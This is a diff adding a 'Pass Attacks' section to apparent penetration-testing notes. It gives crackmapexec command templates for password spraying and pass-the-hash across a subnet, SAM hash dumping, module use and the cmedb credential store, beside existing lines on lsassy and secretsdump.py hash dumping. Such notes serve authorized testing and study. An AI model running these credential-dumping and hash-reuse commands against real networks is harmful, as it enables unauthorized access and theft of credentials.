@@ -12,3 +12,18 @@
         - -M lsassy
 - Secrets Dump will dump hashes on domain
     - [secretsdump.py](http://secretsdump.py) <domain/user:password@ip>
+
+# Pass Attacks (crackmapexec)
+
+- crackmapexec smb <local network/24> -u <username> -d <domain> -p <password>    
+
+- Pass the Hash
+    - crackmapexec smb <local network/24> -u <username> -H <hash> —local-auth
+
+- crackmapexec smb <local network/24> -u <username> -H <hash> —local-auth —sam
+
+- How to use modules
+    - crackmapexec smb <local network/24> -u <username> -H <hash> —local-auth -M <module>
+- How to access the database:
+    - cmedb
+        - creds (good one to see hashes/passwords and where they worked)
